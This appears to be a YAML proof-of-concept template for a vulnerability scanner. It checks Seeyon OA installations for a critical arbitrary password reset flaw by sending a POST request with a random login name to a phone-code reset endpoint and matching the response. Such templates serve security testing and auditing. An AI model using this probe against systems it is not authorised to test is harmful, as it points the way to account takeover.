id: poc-yaml-seeyon-oa-password-reset
info:
  name: 致远OA-任意密码重置
  severity: critical
  tags:
  - 密码重置
  finger: 致远互联-OA
variables:
  v1: random_str(10)
requests:
- method: POST
  path: /seeyon/rest/phoneLogin/phoneCode/resetPassword
  headers:
    Content-Type: application/json
  data: '{"loginName":"{{.v1}}"}

    '
  expression: 'status_code == 500

    && contains(body, "\"success\" : false,")

    && contains(body, "\"message\" : null")

    && !contains(body, "非法操作")

    '
transport: http
